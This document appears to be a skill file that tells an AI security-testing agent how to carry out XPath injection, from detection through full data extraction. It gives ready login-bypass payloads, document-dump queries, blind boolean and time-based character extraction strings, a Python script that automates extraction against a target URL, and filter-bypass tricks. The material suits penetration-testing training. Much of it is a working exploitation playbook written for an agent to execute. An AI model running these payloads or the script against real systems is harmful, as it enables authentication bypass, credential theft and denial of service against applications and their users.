---
name: xpath
description: XPath Injection — authentication bypass, data exfiltration (union/text() dump, position-based iteration), blind boolean exploitation (string-length + substring character enumeration), time-based exploitation, and advanced schema mapping. Use when HauntMode flags XPath injection as APPLIES/MAYBE, when the app stores data in XML, when login or search errors suggest XPath processing, or when you need an end-to-end XPath methodology with payloads and automation scripts.
---

# XPath Injection

This skill covers XPath injection from detection through full data exfiltration: authentication bypass payloads, union-based document dumping, schema depth probing, blind boolean character-by-character extraction, and time-based exploitation when no boolean channel exists. Read top to bottom on first invocation; jump to the section for follow-up work.

---

## 1. Triggers — when this skill applies

- Login form that produces an error unlike SQL (e.g., "XPath query error", "XMLReader", "SimpleXML")
- Search field that appears to query a structured document (street index, product catalog, user directory)
- App running PHP with `.xml` data files or referencing XML in error stack traces
- Input that when injected with `'` returns an XML parse error
- Login that returns "user does not exist" vs. "password wrong" — useful for blind boolean channel
- Any field where `') or ('1'='1` causes different behavior than a literal string

---

---

## 3. XPath syntax reference

### Node selection

| Expression | Meaning |
|---|---|
| `nodename` | Select all `nodename` child nodes of the context node |
| `/` | Document root |
| `//` | Descendant nodes anywhere in the document |
| `.` | Current context node |
| `..` | Parent of context node |
| `@attr` | Attribute node named `attr` |
| `text()` | Text content of the current node |
| `*` | Wildcard — matches any element node |
| `node()` | Matches any node (element, text, attribute) |
| `@*` | Matches any attribute node |
| `|` | Union operator — combine two queries |

### Predicates

| Expression | Meaning |
|---|---|
| `[1]` | First child |
| `[position()=N]` | Nth child |
| `[last()]` | Last child |
| `[position()<3]` | First two children |
| `[tier=2]` | Child where `tier` element equals `2` |
| `[@difficulty="medium"]` | Child with attribute `difficulty="medium"` |

### Useful functions

| Function | Meaning |
|---|---|
| `contains(str, substr)` | True if `str` contains `substr` |
| `substring(str, start, len)` | Extract substring (1-indexed) |
| `string-length(str)` | Length of string |
| `count(nodeset)` | Number of nodes in a node set |
| `name(node)` | Name of the node |
| `position()` | Position of current node |
| `true()` / `false()` | Boolean literals |
| `not(expr)` | Logical NOT |

### Logical operators
`and`, `or`, `=`, `!=`, `<`, `<=`, `>`, `>=`

---

## 4. 30-second triage

Inject these in any suspect input field and observe the response:

```
'
' or '1'='1
') or ('1'='1
' or true() or '
```

**Signals:**
- Error message changes when `'` is injected → likely XPath or SQL injection point
- Response returns all records when `') or ('1'='1` is injected → XPath injection confirmed
- Login succeeds with `' or '1'='1` in username → XPath injection in auth flow

If you get a different error from XPath vs SQL, look for XML-specific keywords: `SimpleXML`, `DOMXPath`, `XMLReader`, `xpath()`, `LIBXML`, `XMLDocument`.

---

## 5. Detection — confirming XPath injection

### Login context
Inject in username field:
```
' or '1'='1
' or true() or '
admin' or '1'='1
```

If login succeeds with any of these → XPath auth injection confirmed.

### Search / query context

Inject in the search field `q`:
```
') or ('1'='1
```

If this returns ALL records instead of no results, XPath injection confirmed. The injected query becomes:
```xpath
/a/b/c[contains(d/text(), '') or ('1'='1')]
```

---

## 6. Authentication bypass payloads

These assume a query of the form:
```xpath
/users/user[username/text()='INPUT' and password/text()='HASH']
```

| Scenario | Username payload | Password |
|---|---|---|
| Known username, plaintext password | `admin' or '1'='1` | anything |
| Unknown username, plaintext | `' or '1'='1` | `' or '1'='1` |
| Password is hashed before query | `' or true() or '` | anything |
| Target user by position | `' or position()=1 or '` | anything |
| Target user by substring of username | `' or contains(.,'admin') or '` | anything |

**When password is hashed** (MD5/SHA — injecting `' or '1'='1` in the password won't work because it's hashed before insertion):

Use a double `or` to short-circuit the password check:
```
Username: ' or true() or '
Password: anything
```
Resulting query:
```xpath
/users/user[username/text()='' or true() or '' and password/text()='<hash>']
```
The `true()` + `or` combination bypasses both checks.

To target a specific user (e.g., admin) when username is unknown:
```
Username: ' or contains(.,'admin') or '
```

---

## 7. Data exfiltration — unrestricted (dump full document)

When the query result is displayed and there is no result-count limit, dump the entire XML document:

**Method 1 — union with `//text()`:**
```
GET /index.php?q=') and ('1'='2&f=fullstreetname | //text()
```
Resulting query:
```xpath
/a/b/c[contains(d/text(), '') and ('1'='2')]/fullstreetname | //text()
```
The first half returns nothing (universally false). `//text()` returns all text nodes in the document.

**Method 2 — traverse to root:**
```
GET /index.php?q=') or ('1'='1&f=../../..//text()
```
Resulting query:
```xpath
/a/b/c[contains(d/text(), '') or ('1'='1')]/../../..//text()
```
Navigates up to document root, then selects all text nodes.

---

## 8. Data exfiltration — restricted (limited result count)

When the app returns only the first N results, iterate through the document manually using position-indexed wildcards.

### Step 1 — Determine schema depth

Use `f` parameter (injected into node selection):
```
f=fullstreetname | /*[1]         → Nothing (array type returned, not a leaf)
f=fullstreetname | /*[1]/*[1]   → Nothing
f=fullstreetname | /*[1]/*[1]/*[1]     → Nothing
f=fullstreetname | /*[1]/*[1]/*[1]/*[1] → "01ST ST"  ← leaf node reached
```
Stop when you get an actual value. That depth is where leaf data lives.

### Step 2 — Extract all fields of the first record

At depth 4 (for example), iterate the last index:
```
f=fullstreetname | /*[1]/*[1]/*[1]/*[1]   → "01ST ST"
f=fullstreetname | /*[1]/*[1]/*[1]/*[2]   → "01ST"
f=fullstreetname | /*[1]/*[1]/*[1]/*[3]   → "ST"
f=fullstreetname | /*[1]/*[1]/*[1]/*[4]   → "No Results!"  ← stop
```

### Step 3 — Move to next record (increment second-to-last index)

```
f=fullstreetname | /*[1]/*[1]/*[2]/*[1]   → "02ND AVE"
```

### Step 4 — Find secondary data sets (increment second index)

```
f=fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[1]  → "htb-stdnt"  ← different depth
```
Re-probe depth for the second dataset (it may differ from the first).

### Position-based exfiltration (when only predicate is injectable)

If you can only inject into `q` (not `f`):
```
q=') and (position()>0) and ('1'='1   → returns first 5
q=') and (position()>5) and ('1'='1   → returns next 5
```
Increment by 5 each time.

---

## 9. Blind boolean XPath injection

Use when the app returns different responses depending on whether the query hits a record (e.g., "Message sent!" vs. "User does not exist!").

### Confirming the boolean channel

```
username: invalid' or '1'='1
→ "Message sent!"   confirms injection
```

### Enumerate root node name

Length:
```
invalid' or string-length(name(/*[1]))=5 and '1'='1
```
Try `=1`, `=2`, ... until "Message sent!" → length found.

Character by character:
```
invalid' or substring(name(/*[1]),1,1)='u' and '1'='1
```
Iterate char and position until all characters confirmed → `users`.

### Count child nodes of the root

```
invalid' or count(/users/*)=2 and '1'='1
```
Try 1, 2, 3 ... until hit.

### Enumerate child node names

```
invalid' or string-length(name(/users/*[1]))=4 and '1'='1
invalid' or substring(name(/users/*[1]),1,1)='u' and '1'='1
```
Repeat for each position index until schema is fully mapped.

### Exfiltrate actual field values

Length:
```
invalid' or string-length(/users/user[1]/username)=5 and '1'='1
```

Value character by character:
```
invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1
```

Increment position (second argument of `substring`) until all chars extracted.

### Automation script (blind boolean)

Write/run this script when manual extraction would take too long:

```python
import requests, string

URL = "http://TARGET/index.php"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
SUCCESS = "Message successfully sent!"
CHARSET = string.ascii_letters + string.digits + "_{}-@!:."

def send(payload):
    r = requests.post(URL, headers=HEADERS,
                      data={"username": payload, "msg": "test"}, timeout=5)
    return SUCCESS in r.text

def get_length(xpath):
    for n in range(1, 64):
        if send(f"invalid' or string-length({xpath})={n} and '1'='1"):
            return n
    return 0

def extract_value(xpath, length):
    result = ""
    for i in range(1, length + 1):
        for c in CHARSET:
            if send(f"invalid' or substring({xpath},{i},1)='{c}' and '1'='1"):
                result += c
                break
    return result

# Example: extract first user's username
length = get_length("/users/user[1]/username")
value  = extract_value("/users/user[1]/username", length)
print(value)
```

You can also install and use xcat:
```bash
python3 -m venv xcat-venv && source xcat-venv/bin/activate
pip3 install cython && pip install --no-deps xcat
pip install aiohttp aiodns appdirs click colorama prompt_toolkit xpath-expressions \
    chardet charset-normalizer yarl attrs frozenlist multidict propcache \
    aiohappyeyeballs aiosignal wcwidth pycares cffi idna
xcat --help
```
See: https://academy.hackthebox.com/module/204/section/2227

---

## 10. Time-based XPath injection

Use when the app returns the **same response** for both valid and invalid queries (no boolean channel).

**Technique:** Force exponential iteration over the XML document. If the condition is true, the app evaluates `count((//.)[count((//.)))])` — a recursive count that causes measurable delay. If false, short-circuit evaluation skips it.

```
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```

- If response takes > 400ms → condition is true, character matches
- If response takes < 10ms → condition is false

Use the same script structure as blind boolean but measure elapsed time instead of response content.

**Caution:** Large XML documents make this very slow and may cause DoS. Test with a small payload first and observe response times. If the document is huge, add more `count()` stacking; if small, one level may be enough.

---

## 11. Bypass techniques

| Obstacle | Bypass |
|---|---|
| Single quotes filtered | Use double quotes if the query uses doubles: `" or "1"="1` |
| Keywords filtered (`or`, `and`) | XPath has no equivalent bypass like SQL comment tricks; try encoding: `&#111;r` (HTML entity `o`) |
| App truncates output | Use position-based iteration (§8, advanced exfiltration) |
| No boolean channel (same response) | Time-based technique (§10) |
| Input reflected in error without execution | Confirm via `') or ('1'='1` in `q` — all records returned |

---

## 12. False-positive checks

- **`') or ('1'='1` returns all records but it's SQL:** Distinguish by error messages — SQL error messages cite MySQL/PostgreSQL/SQLite syntax, XPath errors cite XML/XPath. Also check if `//text()` union works (pure SQL UNION can't return arbitrary paths).
- **Boolean channel unreliable:** Response text contains HTML that changes for other reasons (timing, session state). Baseline multiple requests with a clearly invalid username to confirm stable "false" response.
- **Time-based timing inconsistent:** Network jitter can cause false positives. Run each payload 3 times and take the median. Use a threshold of 3× baseline response time.
- **Auth bypass but no sensitive data:** Logging in as the first user may give a low-privilege account. Check if position 1 is the admin or not before claiming critical impact.

---

## 13. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| XPath auth bypass → admin session | `auth-bypass`, `idor` | Admin access without credentials |
| XPath data exfiltration → password hashes | `sqli` (hashcat/crack) | Offline password cracking → multi-account takeover |
| XPath in PDF generator / SSRF context | `ssrf`, `pdf-injection` | Server-side XML file read |
| Blind XPath → enumerate all usernames | `auth-bypass` (password brute-force with known usernames) | Targeted credential attack |
| XPath in search + IDOR in API | `idor` | User data enumeration |

---

## 14. Reporting template

```
POTENTIAL FINDING: XPath Injection — <Authentication Bypass | Data Exfiltration | Blind Boolean | Time-Based>
Target: <full URL / endpoint>
Parameter: <param name + location: query/body/header>
Injection point: <predicate | node selection | attribute value>
Evidence:
    <e.g., "Username: ' or true() or ' → logged in as admin" |
     "q=') or ('1'='1 → all 847 records returned" |
     "Blind: string-length(/users/user[1]/username)=5 confirmed via 'Message sent!' response">
Working payload: <exact payload>
Data exfiltrated: <description, e.g., "usernames and MD5 password hashes for 3 users">
Impact:
    <e.g., "Authentication bypass — full admin access without credentials" |
     "Full XML document dump including credentials">
Chain potential: <other skills>
Next step: <e.g., "Run blind script to extract all user passwords", "Crack extracted MD5 hashes", "Confirm admin panel accessible post-auth-bypass">
```

---

## 15. Recon tracker vector strings

Only log if the user explicitly authorizes (CLAUDE.md hard rule):

- `xpath:auth-bypass:<payload>` — confirmed XPath auth bypass with named payload
- `xpath:exfil-full` — full XML document dumped via `//text()`
- `xpath:exfil-partial:<depth>` — partial exfiltration at depth N, schema mapped
- `xpath:blind-boolean:<field>` — blind boolean channel confirmed on named field
- `xpath:time-based` — time-based exploitation confirmed
- `xpath:no:<param>` — tested, not injectable

---

## 16. What NOT to do

- **Do not run the time-based payload against large XML documents in production** without understanding the performance impact — recursive `count((//.)[count((//.)))])` can cause significant server load or DoS if the document is large.
- **Do not exfiltrate all data** beyond what's necessary to prove impact — usernames + one password hash is enough to demonstrate the severity; you don't need to dump the entire database.
- **Do not confuse XPath injection with SQL injection** — the syntax is different, the bypass techniques differ, and reporting them as SQL injection will confuse the program.
- **Do not test without confirming the boolean channel baseline** for blind exploitation — run the "definitely invalid" and "definitely valid" cases first to confirm the channel is stable.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not rely on memory for payloads** — re-read the cheatsheet file for the exact query forms needed.
